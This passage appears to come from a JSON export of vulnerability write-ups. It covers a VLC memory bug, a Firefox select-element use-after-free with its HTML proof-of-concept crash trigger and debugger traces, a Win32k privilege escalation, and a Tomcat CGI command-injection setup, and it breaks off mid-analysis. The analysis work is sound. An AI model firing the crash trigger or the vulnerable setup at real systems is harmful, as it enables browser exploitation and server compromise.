BUG: CVE-2019-13962\r\n    {\r\n        msg_Warn(dec, \"dropping frame because the vout changed\");\r\n        return VLC_EGENERIC;\r\n    }\r\n...\r\n```\r\n\r\nThe check is actually broken because they are user controlled; The fields found in picture_t may not actually match the values of AVFrame. If done correctly, we could get past this check, reach this part of the code, and trigger the bug:\r\n\r\n```c\r\n    for (int plane = 0; plane < pic->i_planes; plane++)\r\n    {\r\n        const uint8_t *src = frame->data[plane];\r\n        uint8_t *dst = pic->p[plane].p_pixels;\r\n        size_t src_stride = frame->linesize[plane];\r\n        size_t dst_stride = pic->p[plane].i_pitch;\r\n        size_t size = __MIN(src_stride, dst_stride);\r\n\r\n        for (int line = 0; line < pic->p[plane].i_visible_lines; line++)\r\n        {\r\n            memcpy(dst, src, size);\r\n            src += src_stride;\r\n            dst += dst_stride;\r\n        }\r\n    }\r\n```\r\n\r\nAt this point, it is possible to read more than expected from source.\r\n\r\nA proof of concept is available from the original advisory: https://trac.videolan.org/vlc/ticket/22240",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "b8c972ae-43fa-4e64-9c75-97427f8b0251",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "d266a303-fb62-49d5-8159-447a22b37fff",
      "created": "2019-09-12T18:06:48.322659Z",
      "revisionDate": "2020-02-13T17:12:24.776794Z",
      "document": "The vulnerability is easy enough to reproduce. A use-after-free vulnerability can occur after deleting a selection element due to a weak reference to the select element in the options collection, which gets garbage collected, and results in a potentially exploitable crash.\r\nHowever, it seems jemalloc's free chunk poisoning feature makes it tricky to gain control of the freed select element, therefore making exploitation more difficult in theory. Currently, there are no known working exploit in public.\r\n\r\n## Description\r\n\r\nFirefox is a free and open-source web browser developed by the Mozilla Foundation.\r\n\r\nA use-after-free vulnerability can occur after deleting a selection element due to a weak reference to the select element in the options collection, which gets garbage collected, and results in a potentially exploitable crash. Originally, it was discovered by [Nils](https://twitter.com/Nils).\r\n\r\n## Vulnerable Version\r\n\r\nVersion 29 through 63 are affected. The Mozilla Firefox archive can be found [here](https://ftp.mozilla.org/pub/firefox/releases/).\r\n\r\nTo check out and build the vulnerable version, you can try:\r\n\r\n```\r\n$ hg pull\r\n$ hg update -r 12afa29e9c8cde597314f072c6f0c1f81d681b40\r\n$ ./mach build\r\n```\r\n\r\nYou may need to fix up some errors in order to build Firefox for the above commit. In my case, I ran into some Rust errors related to lack of [macro documentation](https://doc.rust-lang.org/1.7.0/book/macros.html) .\r\n\r\n## Patch\r\n\r\nThe vulnerability was patch on Nov 07 2018 by turning the `HTMLSelectElement` reference tracked in `HTMLOptionsCollection` a strong reference. It was implemented in two parts: The HTMLOptionsCollection class, and the HTMLSelectElement class. The commit can be found as: \r\n\r\n[d4f3e119ae841008c1be59e72ee0a058e3803cf3](https://hg.mozilla.org/mozilla-central/rev/d4f3e119ae841008c1be59e72ee0a058e3803cf3)\r\n\r\n## Proof-of-Concept\r\n\r\nThe poc can be obtained from the [Mozilla bug report #1499861](https://bugzilla.mozilla.org/show_bug.cgi?id=1499861):\r\n\r\n```javascript\r\n<script>\r\n  div = document.createElement(\"div\");\r\n\topt = document.createElement(\"option\");\r\n\tdiv.appendChild(opt);\r\n\tdiv.addEventListener(\"DOMNodeRemoved\", function() {\r\n    sel = 0;\r\n    new ArrayBuffer(0x0fffffff);\r\n    alert();\r\n  });\r\n\tsel = document.createElement(\"select\");\r\n\tsel.options[0] = opt;\r\n</script>\r\n```\r\n\r\n## Initial Impression\r\n\r\nAfter building Firefox, we attach WinDBG to it, and run it against the HTML test case. Immediately, we see a clean crash (where ESI is a reference to our select element):\r\n\r\n```\r\n0:000> r\r\neax=e5e5e5e5 ebx=05b1c940 ecx=09823b00 edx=05b1c940 esi=05b1c940 edi=09898b20\r\neip=6a64cacd esp=0058e810 ebp=0058e960 iopl=0         nv up ei pl nz na po nc\r\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202\r\nxul!nsINode::ReplaceOrInsertBefore+0x6ed:\r\n6a64cacd 8b5804          mov     ebx,dword ptr [eax+4] ds:002b:e5e5e5e9=????????\r\n```\r\n\r\nThe crash also leads to a possibly exploitable condition because the `CALL [EAX+4]` instruction:\r\n\r\n```\r\n0:000> u\r\nxul!nsINode::ReplaceOrInsertBefore+0x6ed [c:\\mozilla-source\\mozilla-central\\dom\\base\\nsINode.cpp @ 2527]:\r\n6a64cacd 8b5804          mov     ebx,dword ptr [eax+4]\r\n6a64cad0 85db            test    ebx,ebx\r\n6a64cad2 741f            je      xul!nsINode::ReplaceOrInsertBefore+0x713 (6a64caf3)\r\n6a64cad4 8b03            mov     eax,dword ptr [ebx]\r\n6a64cad6 53              push    ebx\r\n6a64cad7 ff5004          call    dword ptr [eax+4]\r\n6a64cada 89d9            mov     ecx,ebx\r\n6a64cadc 899db8feffff    mov     dword ptr [ebp-148h],ebx\r\n```\r\n\r\nThe value `e5e5e5e9` indicates a freed chunk being filled by the jemalloc allocator. Internally this behavior is called \"poisoning\", because it allows the application to be somewhat in control of the freed chunk of memory over the attacker. The value was also [carefully selected](https://bugzilla.mozilla.org/show_bug.cgi?id=1044077) by the developers to make sure nobody can ever reach it.\r\n\r\nThe callstack for our crash also reveals where the reference might be kept:\r\n\r\n```\r\n0:000> k\r\n # ChildEBP RetAddr  \r\n00 0058e960 6af72d6f xul!nsINode::ReplaceOrInsertBefore+0x6ed [c:\\mozilla-source\\mozilla-central\\dom\\base\\nsINode.cpp @ 2527] \r\n01 0058e994 6ac37d55 xul!mozilla::dom::HTMLOptionsCollection::IndexedSetter+0x5f [c:\\mozilla-source\\mozilla-central\\dom\\html\\HTMLOptionsCollection.cpp @ 155] \r\n02 0058e9fc 6ace7984 xul!mozilla::dom::HTMLOptionsCollection_Binding::DOMProxyHandler::setCustom+0x255 [c:\\mozilla-source\\mozilla-central\\obj-i686-pc-mingw32\\dom\\bindings\\HTMLOptionsCollectionBinding.cpp @ 989] \r\n03 0058ea60 6c74ef37 xul!mozilla::dom::DOMProxyHandler::set+0x34 [c:\\mozilla-source\\mozilla-central\\dom\\bindings\\DOMJSProxyHandler.cpp @ 255] \r\n04 0058eab8 6c855224 xul!js::Proxy::set+0x127 [c:\\mozilla-source\\mozilla-central\\js\\src\\proxy\\Proxy.cpp @ 450] \r\n05 0058edf8 6c853996 xul!Interpret+0x1724 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 3328] \r\n06 0058ee80 6c85f24a xul!js::RunScript+0x196 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 447] \r\n07 0058eee0 6c85f399 xul!js::ExecuteKernel+0xfa [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 813] \r\n08 0058ef30 6c561970 xul!js::Execute+0xe9 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 845] \r\n09 0058ef54 6c561b2a xul!ExecuteScript+0x60 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\CompilationAndEvaluation.cpp @ 394] \r\n0a 0058ef98 6c561a34 xul!ExecuteScript+0xea [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\CompilationAndEvaluation.cpp @ 415] \r\n0b 0058efa8 6a658689 xul!JS_ExecuteScript+0x14 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\CompilationAndEvaluation.cpp @ 436] \r\n0c 0058efcc 6b4a1b4a xul!nsJSUtils::ExecutionContext::CompileAndExec+0x69 [c:\\mozilla-source\\mozilla-central\\dom\\base\\nsJSUtils.cpp @ 254] \r\n0d 0058f160 6b4a06c9 xul!mozilla::dom::ScriptLoader::EvaluateScript+0x7ca [c:\\mozilla-source\\mozilla-central\\dom\\script\\ScriptLoader.cpp @ 2415] \r\n0e 0058f1a8 6b49fce4 xul!mozilla::dom::ScriptLoader::ProcessRequest+0x239 [c:\\mozilla-source\\mozilla-central\\dom\\script\\ScriptLoader.cpp @ 2036] \r\n0f 0058f268 6b499821 xul!mozilla::dom::ScriptLoader::ProcessInlineScript+0x564 [c:\\mozilla-source\\mozilla-central\\dom\\script\\ScriptLoader.cpp @ 1636] \r\n10 0058f520 6b499280 xul!mozilla::dom::ScriptLoader::ProcessScriptElement+0x551 [c:\\mozilla-source\\mozilla-central\\dom\\script\\ScriptLoader.cpp @ 1356] \r\n11 0058f554 6a15c3e1 xul!mozilla::dom::ScriptElement::MaybeProcessScript+0x160 [c:\\mozilla-source\\mozilla-central\\dom\\script\\ScriptElement.cpp @ 141] \r\n12 0058f570 6a15ae9f xul!nsHtml5TreeOpExecutor::RunScript+0x101 [c:\\mozilla-source\\mozilla-central\\parser\\html\\nsHtml5TreeOpExecutor.cpp @ 742] \r\n13 0058f5bc 6a15dd9c xul!nsHtml5TreeOpExecutor::RunFlushLoop+0x40f [c:\\mozilla-source\\mozilla-central\\parser\\html\\nsHtml5TreeOpExecutor.cpp @ 544] \r\n14 0058f5c4 6994f087 xul!nsHtml5ExecutorFlusher::Run+0x1c [c:\\mozilla-source\\mozilla-central\\parser\\html\\nsHtml5StreamParser.cpp @ 125] \r\n15 0058f604 6995a53f xul!mozilla::SchedulerGroup::Runnable::Run+0x27 [c:\\mozilla-source\\mozilla-central\\xpcom\\threads\\SchedulerGroup.cpp @ 337] \r\n16 0058fb10 6995c6b6 xul!nsThread::ProcessNextEvent+0x60f [c:\\mozilla-source\\mozilla-central\\xpcom\\threads\\nsThread.cpp @ 1246] \r\n17 0058fb34 69d28494 xul!NS_ProcessNextEvent+0x56 [c:\\mozilla-source\\mozilla-central\\xpcom\\threads\\nsThreadUtils.cpp @ 530] \r\n18 0058fb5c 69d0580d xul!mozilla::ipc::MessagePump::Run+0xe4 [c:\\mozilla-source\\mozilla-central\\ipc\\glue\\MessagePump.cpp @ 97] \r\n19 0058fb94 69d05776 xul!MessageLoop::RunHandler+0x6d [c:\\mozilla-source\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 319] \r\n1a 0058fbb4 6b540055 xul!MessageLoop::Run+0x46 [c:\\mozilla-source\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 299] \r\n1b 0058fbc4 6b594e3f xul!nsBaseAppShell::Run+0x25 [c:\\mozilla-source\\mozilla-central\\widget\\nsBaseAppShell.cpp @ 160] \r\n1c 0058fbe0 6c4688d7 xul!nsAppShell::Run+0xaf [c:\\mozilla-source\\mozilla-central\\widget\\windows\\nsAppShell.cpp @ 420] \r\n1d 0058fbf8 69d287d8 xul!XRE_RunAppShell+0x37 [c:\\mozilla-source\\mozilla-central\\toolkit\\xre\\nsEmbedFunctions.cpp @ 939] \r\n1e 0058fc10 69d0580d xul!mozilla::ipc::MessagePumpForChildProcess::Run+0x18 [c:\\mozilla-source\\mozilla-central\\ipc\\glue\\MessagePump.cpp @ 302] \r\n1f 0058fc48 69d05776 xul!MessageLoop::RunHandler+0x6d [c:\\mozilla-source\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 319] \r\n20 0058fc68 6c468729 xul!MessageLoop::Run+0x46 [c:\\mozilla-source\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 299] \r\n21 0058fd68 6c470fc1 xul!XRE_InitChildProcess+0x7c9 [c:\\mozilla-source\\mozilla-central\\toolkit\\xre\\nsEmbedFunctions.cpp @ 769] \r\n22 0058fd7c 00f114f6 xul!mozilla::BootstrapImpl::XRE_InitChildProcess+0x11 [c:\\mozilla-source\\mozilla-central\\toolkit\\xre\\Bootstrap.cpp @ 69] \r\n23 0058fee8 00f111cd firefox!NS_internal_main+0x286 [c:\\mozilla-source\\mozilla-central\\browser\\app\\nsBrowserApp.cpp @ 301] \r\n24 0058ff14 00f467bb firefox!wmain+0x1cd [c:\\mozilla-source\\mozilla-central\\toolkit\\xre\\nsWindowsWMain.cpp @ 143] \r\n25 0058ff5c 746f8674 firefox!__scrt_common_main_seh+0xfa [d:\\agent\\_work\\4\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 288] \r\n26 0058ff70 77c05e17 KERNEL32!BaseThreadInitThunk+0x24\r\n27 0058ffb8 77c05de7 ntdll!__RtlUserThreadStart+0x2f\r\n28 0058ffc8 00000000 ntdll!_RtlUserThreadStart+0x1b\r\n```\r\n\r\nIn source, the crash occurs at this line:\r\n\r\n```cpp\r\nnsINode*\r\nnsINode::ReplaceOrInsertBefore(bool aReplace, nsINode* aNewChild,\r\n                               nsINode* aRefChild, ErrorResult& aError)\r\n{\r\n\t...\r\n  mozAutoDocUpdate batch(GetComposedDoc(), true); // Crash\r\n  ...\r\n```\r\n\r\n## In-Depth Analysis\r\n\r\n### The Sequential Order\r\n\r\nDebugging a use-after-free in a browser is not exactly a straight forward task, because typically a bug like this involves multiple event handlers, where browsers tend to have trouble with. A strategy for this is try to understand the events in a sequential order, and one approach for that is by printing debugging messages for each JavaScript line (plus others if you\\'re particularily interested in different things), and see what the debugger tells you.\r\n\r\nThe breakpoints I used:\r\n\r\n```\r\nbu xul!js::math_sin \".printf \\\"[Sin Message] %ma\\\\n\\\", poi(poi(esp+c)+10)+ 8; g\"\r\nbu xul!NS_NewHTMLSelectElement+0x17 \".printf \\\"Select Element = 0x%p\\\\n\\\", eax; g\"\r\nbu xul!js::math_cos\r\nbu xul!mozilla::dom::HTMLOptionsCollection::IndexedSetter \"r; g\"\r\nbu xul!js::ArrayBufferObject::class_constructor+0x13b \".printf \\\"ArrayBuffer=0x%p Size=0x%08x\\\\n\\\", eax, poi(ebp-0x2c); g\"\r\nbu xul!NS_NewHTMLOptionElement+0x10 \".printf \\\"Option Element = 0x%p\\\\n\\\", eax; g\"\r\n```\r\n\r\nAnother trick I also did was break-on-write on the select element after creation. Knowing that the select element is freed and later poisoned by jemalloc, the break-on-write technique would allow us to find when those happen:\r\n\r\n```\r\n[Sin Message] Creating select element\r\nSelect Element = 0x064f8040\r\n...\r\n0:000> ba w4 064f8040\r\n```\r\n\r\nOur modified test case customized for those breakpoints:\r\n\r\n```html\r\n<script>\r\n  Math.sin(\"Creating div element\");\r\n  div = document.createElement(\"div\");\r\n  Math.sin(\"Creating option element\");\r\n  opt = document.createElement(\"option\");\r\n  Math.sin(\"Append option\");\r\n  div.appendChild(opt);\r\n  Math.sin(\"Adding listener\");\r\n  div.addEventListener(\"DOMNodeRemoved\", function() {\r\n    Math.cos(1);\r\n    Math.sin(\"sel=0\");\r\n    sel = 0;\r\n    Math.sin(\"new ArrayBuffer\");\r\n    new ArrayBuffer(0xfffffff);\r\n    Math.cos(1);\r\n    Math.sin(\"alert\");\r\n    alert();\r\n  });\r\n  Math.sin(\"Creating select element\");\r\n  sel = document.createElement(\"select\");\r\n  Math.sin(\"Setting option\");\r\n  sel.options[0] = opt;\r\n</script>\r\n```\r\n\r\nBy running the above test case, we got our sequence of events. I\\'d like to explain them in two stages, where the second is where things get more hairy for Firefox, eventually causing to fail.\r\n\r\n#### The Setup Stage\r\n\r\n1. DIV element is created.\r\n\r\n2. OPTION element is created.\r\n\r\n3. OPTION element appends to the DIV element.\r\n\r\n4. The DOMNodeRemoved listener for the DIV element is added.\r\n\r\n5. The SELECT element is created. This is also when a `mSelect` weak reference is created:\r\n\r\n   ```cpp\r\n   // In dom\\html\\HTMLOptionsCollection.cpp\r\n   // line 34\r\n   // The callstack for this would be:\r\n   // 00 xul!mozilla::dom::HTMLOptionsCollection::HTMLOptionsCollection\r\n   // 01 xul!mozilla::dom::HTMLSelectElement::HTMLSelectElement\r\n   // 02 xul!NS_NewHTMLSelectElement\r\n   // 03 xul!CreateHTMLElement\r\n   HTMLOptionsCollection::HTMLOptionsCollection(HTMLSelectElement* aSelect)\r\n   {\r\n     // Do not maintain a reference counted reference. When\r\n     // the select goes away, it will let us know.\r\n     mSelect = aSelect;\r\n   }\r\n   ```\r\n\r\n#### The Bug Triggering Stage\r\n\r\nAfter the setup stage, the following events happen and finally get us a crash:\r\n\r\n1. The SELECT element\\'s options at index 0 is set with the Option element.\r\n2. In the event handler, the SELECT element is set to 0.\r\n3. A new ArrayBuffer with size `0x0fffffff` is created.\r\n4. An alert pops up.\r\n5. Firefox crashes.\r\n\r\nFirst off, the DOMNodeRemoved event handler for the DIV element is triggered. This condition occurs when the Option element is being assigned as a member to a select element:\r\n\r\n```javascript\r\nsel.options[0] = opt;\r\n```\r\n\r\nUnder the hood, this means we\\'re asking the index setter in the HTMLOptionsCollection to kick in, which causes `nsContentUtils::MaybeFireNodeRemoved` to fire like this callstack shows:\r\n\r\n```\r\nBreakpoint 7 hit\r\neax=08715060 ebx=00000000 ecx=08730401 edx=00000001 esi=000000fb edi=087304c0\r\neip=6a89c870 esp=006fe814 ebp=006fe970 iopl=0         nv up ei pl nz na pe nc\r\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206\r\nxul!nsContentUtils::MaybeFireNodeRemoved:\r\n6a89c870 55              push    ebp\r\n0:000> k\r\n # ChildEBP RetAddr  \r\n00 006fe810 6a9bc4bf xul!nsContentUtils::MaybeFireNodeRemoved [c:\\mozilla-source\\mozilla-central\\dom\\base\\nsContentUtils.cpp @ 4689] \r\n01 006fe970 6b2e2d6f xul!nsINode::ReplaceOrInsertBefore+0xdf [c:\\mozilla-source\\mozilla-central\\dom\\base\\nsINode.cpp @ 2335] \r\n02 006fe9a4 6afa7d55 xul!mozilla::dom::HTMLOptionsCollection::IndexedSetter+0x5f [c:\\mozilla-source\\mozilla-central\\dom\\html\\HTMLOptionsCollection.cpp @ 155] \r\n03 006fea0c 6b057984 xul!mozilla::dom::HTMLOptionsCollection_Binding::DOMProxyHandler::setCustom+0x255 [c:\\mozilla-source\\mozilla-central\\obj-i686-pc-mingw32\\dom\\bindings\\HTMLOptionsCollectionBinding.cpp @ 989] \r\n04 006fea70 6cabef37 xul!mozilla::dom::DOMProxyHandler::set+0x34 [c:\\mozilla-source\\mozilla-central\\dom\\bindings\\DOMJSProxyHandler.cpp @ 255] \r\n05 006feac8 6cbc5224 xul!js::Proxy::set+0x127 [c:\\mozilla-source\\mozilla-central\\js\\src\\proxy\\Proxy.cpp @ 450] \r\n06 006fee08 6cbc3996 xul!Interpret+0x1724 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 3328] \r\n07 006fee90 6cbcf24a xul!js::RunScript+0x196 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 447] \r\n08 006feef0 6cbcf399 xul!js::ExecuteKernel+0xfa [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 813] \r\n09 006fef40 6c8d1970 xul!js::Execute+0xe9 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\Interpreter.cpp @ 845] \r\n0a 006fef64 6c8d1b2a xul!ExecuteScript+0x60 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\CompilationAndEvaluation.cpp @ 394] \r\n0b 006fefa8 6c8d1a34 xul!ExecuteScript+0xea [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\CompilationAndEvaluation.cpp @ 415] \r\n0c 006fefb8 6a9c8689 xul!JS_ExecuteScript+0x14 [c:\\mozilla-source\\mozilla-central\\js\\src\\vm\\CompilationAndEvaluation.cpp @ 436] \r\n```\r\n\r\nIn the event listener, the first thing that happens is this line. This allows the last reference for the select element to be removed:\r\n\r\n```javascript\r\nsel = 0;\r\n```\r\n\r\nThe next that happens is these two lines:\r\n\r\n```javascript\r\nnew ArrayBuffer(0xfffffff);\r\nalert();\r\n```\r\n\r\nThe purpose of the large ArrayBuffer is to create \"pressure\" in order to force the garbage collector to go to work. After the alert function, the garbage collector starts cleaning up the select element by calling its destructor (found in dom\\html\\HTMLSelectElement.cpp):\r\n\r\n```cpp\r\nHTMLSelectElement::~HTMLSelectElement()\r\n{\r\n  mOptions->DropReference();\r\n}\r\n```\r\n\r\nThe `~HTMLSelectElement` destructor is called multiple times. Since `mSelect` is a weak reference, the garbage collector eventually causes the select element to be freed by jemalloc, but HTMLOptionsCollection still has a reference:\r\n\r\n```\r\n0:000> k\r\n # ChildEBP RetAddr  \r\n00 006fc3e0 7448d708 VCRUNTIME140!memset+0x3c [d:\\agent\\_work\\4\\s\\src\\vctools\\crt\\vcruntime\\src\\string\\i386\\memset.asm @ 86] \r\n01 006fc40c 7448d510 mozglue!arena_t::DallocSmall+0x58 [c:\\mozilla-source\\mozilla-central\\memory\\build\\mozjemalloc.cpp @ 3442] \r\n02 006fc434 7448a520 mozglue!arena_dalloc+0x60 [c:\\mozilla-source\\mozilla-central\\memory\\build\\mozjemalloc.cpp @ 3530] \r\n03 006fc440 6b2fb498 mozglue!Allocator<MozJemallocBase>::free+0x20 [c:\\mozilla-source\\mozilla-central\\memory\\build\\malloc_decls.h @ 40] \r\n04 006fc450 6a8f3491 xul!mozilla::dom::HTMLSelectElement::~HTMLSelectElement+0x18 [c:\\mozilla-source\\mozilla-central\\dom\\html\\HTMLSelectElement.cpp @ 146] \r\n05 006fc45c 6a8facff xul!mozilla::dom::Attr::DeleteCycleCollectable+0x11 [c:\\mozilla-source\\mozilla-central\\dom\\base\\Attr.cpp @ 100] \r\n06 006fc468 69c7056f xul!nsIContent::cycleCollection::DeleteCycleCollectable+0xf [c:\\mozilla-source\\mozilla-central\\dom\\base\\nsIContent.h @ 75] \r\n07 006fc498 69c694ff xul!SnowWhiteKiller::Visit+0x19f [c:\\mozilla-source\\mozilla-central\\xpcom\\base\\nsCycleCollector.cpp @ 2785] \r\n08 006fc4fc 69c6c80e xul!nsPurpleBuffer::VisitEntries<SnowWhiteKiller>+0x15f [c:\\mozilla-source\\mozilla-central\\xpcom\\base\\nsCycleCollector.cpp @ 1106] \r\n09 006fc534 6a32579f xul!nsCycleCollector_doDeferredDeletionWithBudget+0x6e [c:\\mozilla-source\\mozilla-central\\xpcom\\base\\nsCycleCollector.cpp @ 4389] \r\n0a 006fc5dc 69cd20d4 xul!AsyncFreeSnowWhite::Run+0x9f [c:\\mozilla-source\\mozilla-central\\js\\xpconnect\\src\\XPCJSRuntime.cpp @ 138] \r\n```\r\n\r\nDuring the process, the `arena_t::DallocSmall` function quietly sets the freed chunk with 0xe5e5e5e5:\r\n\r\n```cpp\r\n...\r\nconst uint8_t kAllocPoison = 0xe5; // Line 1228\r\n...\r\n  \r\nvoid\r\narena_t::DallocSmall(arena_chunk_t* aChunk,\r\n                     void* aPtr,\r\n                     arena_chunk_map_t* aMapElm)\r\n{\r\n  arena_run_t* run;\r\n  arena_bin_t* bin;\r\n  size_t size;\r\n\r\n  run = (arena_run_t*)(aMapElm->bits & ~gPageSizeMask);\r\n  MOZ_DIAGNOSTIC_ASSERT(run->mMagic == ARENA_RUN_MAGIC);\r\n  bin = run->mBin;\r\n  size = bin->mSizeClass;\r\n  MOZ_DIAGNOSTIC_ASSERT(uintptr_t(aPtr) >=\r\n                        uintptr_t(run) + bin->mRunFirstRegionOffset);\r\n  MOZ_DIAGNOSTIC_ASSERT(\r\n    (uintptr_t(aPtr) - (uintptr_t(run) + bin->mRunFirstRegionOffset)) % size ==\r\n    0);\r\n\r\n  // This is where our freed memory is filled with 0xe5e5e5e5...\r\n  memset(aPtr, kAllocPoison, size);\r\n  ...\r\n```\r\n\r\nAfter the memory is freed, we\\'re pretty done with the DOMNodeRemoved handler and back to the `nsINode::ReplaceOrInsertBefore` function that called it. Since the `ReplaceOrInsertBefore` function still has a `mSelect` reference, eventually this causes a crash while setting up for a `CALL [EAX+4]` call. Looking up the selet element\\'s vftable, offset 4 indicates the program is trying to call the `AddRef()` function:\r\n\r\n```\r\n[Sin Message] Creating select element\r\nSelect Element = 0x0eefd340 <--- This appears in esi\r\n\r\n...\r\n\r\n0:000> r\r\neax=e5e5e5e5 ebx=0eefd340 ecx=11303100 edx=0eefd340 esi=0eefd340 edi=0eea4e80\r\neip=6a9bcacd esp=008fe7f0 ebp=008fe940 iopl=0         nv up ei pl nz na po nc\r\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202\r\nxul!nsINode::ReplaceOrInsertBefore+0x6ed:\r\n6a9bcacd 8b5804          mov     ebx,dword ptr [eax+4] ds:002b:e5e5e5e9=????????\r\n\r\n...\r\n\r\n6a9bcaca 8b4610          mov     eax,dword ptr [esi+10h]\r\n6a9bcacd 8b5804          mov     ebx,dword ptr [eax+4] ds:002b:e5e5e5e9=????????\r\n6a9bcad0 85db            test    ebx,ebx\r\n6a9bcad2 741f            je      xul!nsINode::ReplaceOrInsertBefore+0x713 (6a9bcaf3)\r\n6a9bcad4 8b03            mov     eax,dword ptr [ebx]\r\n6a9bcad6 53              push    ebx\r\n6a9bcad7 ff5004          call    dword ptr [eax+4]\r\n\r\n```\r\n\r\nReading from the conversation between developers in the bug report, we learned that something like this in theory should have been caught easily with a fuzzer such as Domato. It just didn\\'t, and the bug lived for many years.\r\n\r\nMore research time is needed to investigate how exploitation could be done.",
      "score": 0,
      "metadata": {},
      "tags": []
    },
    {
      "id": "0261c512-8646-4a3c-aa9a-4f0a5a2e541f",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "fcd6bd45-ab66-4764-aff8-e1adcdc65e40",
      "created": "2019-09-12T18:06:49.76432Z",
      "revisionDate": "2020-04-28T21:38:03.717542Z",
      "document": "This is another priv esc in the win32k.sys system.  It leverages windows popup windows to craft a race condition to overwrite an allocated section of memory, then hand that memory location to a funtion that executes it in Kernel mode.\r\n\r\nIt is being actively used in the wild.\r\n\r\nThe mitigations are pretty strong.  Microsoft released a patch, and internal security controls on Windows 8 and above prevent writing to the allocated memory, so while the exploit might be present on later systems, it is not usable.   In the writeup by the discoverer, (s)he claims that the fix in Windows 8 was backported to Windows 7x64 systems, but lists SP1 as vulnerable.  I assume this means the fix was in a patch release.\r\n",
      "score": 0,
      "metadata": {},
      "tags": []
    },
    {
      "id": "fb2aaeaf-f1dd-4fdc-b3c4-76ef2c8b16da",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "1d624c3c-7f37-4d01-82c2-583bb1e19e4f",
      "created": "2019-09-12T18:06:51.616967Z",
      "revisionDate": "2020-02-13T17:12:24.189014Z",
      "document": "## Background\r\n\r\nApache Tomcat is an open source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and Java WebSocket technologies. It powers numerous large-scale, mission-critical web applications across a diverse range of industries and organizations.\r\n\r\nThe Common Gateway Interface (CGI) defines a way for a web server to interact with external content-generating programs, which are often referred to as CGI programs. Within Tomcat, CGI support is disabled by default, but can be manually added in the configuration file.\r\n\r\nOne of the configurations for the CGI servlet is enableCmdLineArguments, which allows command line arguments from the query string, but can be abused to inject system commands in order to gain remote code execution.\r\n\r\n## Vulnerable Setup\r\n\r\nThe following versions of Apache Tomcat on Windows are effected:\r\n\r\n* 9.0.0.M1 to 9.0.17\r\n* 8.5.0 to 8.5.39\r\n* 7.0.0 to 7.0.93\r\n\r\nSince enableCmdLineArguments isn't enabled by default, the following code needs to be added in the conf/web.xml file:\r\n\r\n```xml\r\n<servlet>\r\n<servlet-name>cgi</servlet-name>\r\n<servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>\r\n<init-param>\r\n  <param-name>cgiPathPrefix</param-name>\r\n  <param-value>WEB-INF/cgi</param-value>\r\n</init-param>\r\n<init-param>\r\n  <param-name>executable</param-name>\r\n  <param-value></param-value>\r\n</init-param>\r\n<init-param>\r\n  <param-name>enableCmdLineArguments</param-name>\r\n  <param-value>true</param-value>\r\n</init-param>\r\n<load-on-startup>5</load-on-startup>\r\n</servlet>\r\n```\r\n\r\nAlso:\r\n\r\n```xml\r\n<servlet-mapping>\r\n<servlet-name>cgi</servlet-name>\r\n<url-pattern>/cgi/*</url-pattern>\r\n</servlet-mapping>\r\n```\r\n\r\nFinally, a script should be added in the webapps\\ROOT\\WEB-INF\\cgi directory, which is the trigger for the CGI servlet:\r\n\r\n```bash\r\n@echo off\r\necho Content-Type: text/plain\r\necho.\r\necho Hello, World!\r\n```\r\n\r\nFor convenience, a vulnerable setup of Apache Tomcat can be downloaded [here](https://github.com/rapid7/metasploit-framework/files/3303314/apache-tomcat-9.0.17.zip). It was also used during the analysis on a x64 Windows 10 with JDK 8 installed.\r\n\r\n## Vulnerability Analysis\r\n\r\n### Static Code Analysis\r\n\r\nIn Apache Tomcat, CGI support is handled by the CGIServlet class, which can be found in the lib/catalina.jar file. You can easily find this by grepping for **CGISeverlet** as the keyword.\r\n\r\nCGIServlet is a subclass of the abstract HttpServlet class, which is within the Java API. The way you want to start reading this code is by looking at the service method, which will tell you to go down to doGet, so let's start with doGet:\r\n\r\n```java\r\nprotected void doGet(HttpServletRequest req, HttpServletResponse res)\r\n        throws ServletException, IOException {\r\n\r\n    CGIEnvironment cgiEnv = new CGIEnvironment(req, getServletContext());\r\n\r\n    if (cgiEnv.isValid()) {\r\n        CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(),\r\n                                      cgiEnv.getEnvironment(),\r\n                                      cgiEnv.getWorkingDirectory(),\r\n                                      cgiEnv.getParameters());\r\n\r\n        if (\"POST\".equals(req.getMethod())) {\r\n            cgi.setInput(req.getInputStream());\r\n        }\r\n        cgi.setResponse(res);\r\n        cgi.run();\r\n    } else {\r\n        res.sendError(404);\r\n    }\r\n\r\n    if (log.isTraceEnabled()) {\r\n        String[] cgiEnvLines = cgiEnv.toString().split(System.lineSeparator());\r\n        for (String cgiEnvLine : cgiEnvLines) {\r\n            log.trace(cgiEnvLine);\r\n        }\r\n\r\n        printServletEnvironment(req);\r\n    }\r\n}\r\n```\r\n\r\nThe first thing that happens in the doGet method 